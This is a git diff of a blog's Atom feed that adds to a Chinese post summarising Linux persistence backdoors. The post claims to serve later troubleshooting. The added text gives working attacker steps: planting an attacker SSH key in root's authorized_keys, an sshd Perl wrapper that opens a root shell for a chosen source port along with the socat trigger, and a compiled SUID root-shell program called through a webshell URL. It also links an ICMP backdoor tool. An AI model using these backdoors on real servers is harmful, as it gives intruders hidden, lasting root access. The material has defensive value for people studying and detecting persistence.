@@ -1,15 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ukonwho.github.io</id>
-    <title>Lucius‘ Blog</title>
-    <updated>2020-06-11T02:08:22.180Z</updated>
+    <title>奇怪的知识</title>
+    <updated>2020-08-26T02:59:43.183Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ukonwho.github.io"/>
     <link rel="self" href="https://ukonwho.github.io/atom.xml"/>
     <subtitle>奇怪的知识叕增加了</subtitle>
     <logo>https://ukonwho.github.io/images/avatar.png</logo>
     <icon>https://ukonwho.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2020, Lucius‘ Blog</rights>
+    <rights>All rights reserved 2020, 奇怪的知识</rights>
     <entry>
         <title type="html"><![CDATA[Linux常见的持久化后门汇总]]></title>
         <id>https://ukonwho.github.io/post/linux-chang-jian-de-chi-jiu-hua-hou-men-hui-zong/</id>
@@ -18,7 +18,6 @@
         <updated>2020-06-11T01:55:09.000Z</updated>
         <content type="html"><![CDATA[<h2 id="0x00前言">0x00:前言</h2>
 <p>持久化后门是指当入侵者通过某种手段拿到服务器的控制权之后,通过在服务器上放置一些后门(脚本、进程、连接之类),来方便他以后持久性的入侵,简单梳理一下日常遇见windows用的比较多的一些持久化方式方便以后排查问题使用.</p>
-<h2 id="centerlinuxcenter"><center>Linux</center></h2>
 <h2 id="0x01ssh">0x01:SSH</h2>
 <h3 id="一-ssh软连接">一、ssh软连接</h3>
 <center>SSH软连接后门的原理</center>
@@ -39,6 +38,92 @@
 </code></pre>
 <p>参考:https://www.jozxing.cc/archives/1653</p>
 <h3 id="二-ssh利用公钥免密登录">二、ssh利用公钥免密登录</h3>
+<p><strong>受害者</strong>:1.1.1.x<br>
+<strong>攻击者</strong>:2.2.2.x<br>
+现在攻击者想配置免密登录连接受害者</p>
+<ol>
+<li>
+<p>攻击者机器:</p>
+<p><code># ssh-keygen -b 4096 -t rsa</code></p>
+<p>一路回车回车默认就行,在/root/.ssh/目录下生成了两个文件<br>
+id_rsa、id_rsa.pub</p>
+<p><code># cat /root/.ssh/id_rsa.pub</code></p>
+<p>全部copy文件内容</p>
+</li>
+<li>
+<p>受害者机器：<br>
+<code># vi /root/.ssh/authorized_keys</code></p>
+<p>攻击者的id_rsa.pub内容粘贴到文件里面(如果原来存在内容就另起一行粘贴)<br>
+<code># chmod 600 /root/.ssh/authorized_keys</code><br>
+<code># chmod 700 /root/.ssh</code></p>
+</li>
+<li>
+<p>攻击者利用公钥登录<br>
+<code># ssh -i /root/.ssh/id_rsa root@2.2.2.x</code></p>
+<p><em>缺点:容易被发现</em></p>
+</li>
+</ol>
+<h3 id="三-ssh-wrapper后门">三、ssh  wrapper后门</h3>
+<p>init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候,正则匹配会失败,于是执行下一句,启动/usr/bin/sshd,这是原始sshd.</p>
+<p>原始的sshd监听端口建立了tcp连接后,会fork一个子进程处理具体工作.这个子进程,没有什么检验,而是直接执行系统默认的位置的/usr/sbin/sshd,这样子控制权又回到脚本了.此时子进程标准输入输出已被重定向到套接字,getpeername能真的获取到客户端的TCP源端口,如果是19526就执行sh给个shell.</p>
+<ol>
+<li>被控端</li>
+</ol>
+<pre><code class="language-bash">[root@Jaky ~]# cd /usr/sbin
+[root@Jaky sbin]# mv sshd ../bin
+[root@Jaky sbin]# echo ‘#!/usr/bin/perl’ &gt;sshd
+[root@Jaky sbin]# echo ‘exec “/bin/sh” if(getpeername(STDIN) =~ /^..4A/);’ &gt;&gt;sshd
+[root@Jaky sbin]# echo ‘exec{“/usr/bin/sshd”} “/usr/sbin/sshd”,@ARGV,’ &gt;&gt;sshd
+[root@Jaky sbin]# chmod u+x sshd
+[root@Jaky sbin]# /etc/init.d/sshd restart
+</code></pre>
+<ol start="2">
+<li>控制端<br>
+<code>socat STDIOTCP4:受害者IP:22,sourceport=19526</code></li>
+</ol>
+<p>优点:</p>
+<ul>
+<li>隐蔽性较强,无需要编译,使用于大部分环境中.</li>
+<li>在无连接后门的情况下,管理员是看不到端口和进程的,last也查不到登陆.</li>
+</ul>
+<p>缺点:</p>
+<ul>
+<li>需要重启sshd进程.</li>
+</ul>
+<h3 id="四-crontab定时任务">四、Crontab定时任务</h3>
+<p>Crontab定时任务就像windows中的定时任务,在Linux系统中,计划任务一般是由cron承担,我们可以把cron设置为开机时自动启动.<br>
+Cron 表达式生成网站：https://qqe2.com/cron</p>
+<h2 id="0x02suid后门">0x02:SUID后门</h2>
+<p>当s这个标志出现在文件所有者的x权限上时,此时就被称为Set UID.简程SUID.<br>
+当一个文件或者程序所属 suid为0时,那么它的归属及为root,当执行该文件时,其实是以root身份执行的.<br>
+必要条件：</p>
+<ol>
+<li>SUID权限仅对二进制程序有效。</li>
+<li>执行者对于该程序需要具有x的可执行权限</li>
+<li>本权限仅在执行该程序的过程中有效</li>
+<li>在执行过程中执行者将具有该程序拥有者的权限</li>
+</ol>
+<p>举个栗子</p>
+<pre><code class="language-c">#include&lt;stdlib.h&gt;
+main () {
+setuid(0);
+system(&quot;/bin/bash&quot;);
+}
+</code></pre>
+<pre><code class="language-bash">编译成二进制文件
+gcc suid.c -o luomiweixiong
+赋予suid权限
+chmod 4755 luomiweixiong
+chmod u+s luomiweixiong
+假设webshell权限较低，希望使用suid shell执行root命令，通过web的方式调用
+http://localhost/suid.php?path=/tmp/luomiweixiong&amp;cmd=id
+即可以root的权限执行命令id
+</code></pre>
+<p>参考: https://pythonpig.github.io/2018/06/26/suid%E5%90%8E%E9%97%A8(suid-shell)/</p>
+<h2 id="0x03协议后门">0x03:协议后门</h2>
+<p>在一些访问控制做的比较严格的环境中,由内到外的TCP流量会被阻断掉.但是对于UDP(DNS、ICMP)相关流量通常不会拦截.<br>
+主要原理就是利用ICMP中可控的data字段进行数据传输<br>
+Github上的协议后门利用: https://github.com/andreafabrizi/prism</p>
 ]]></content>
     </entry>
     <entry>
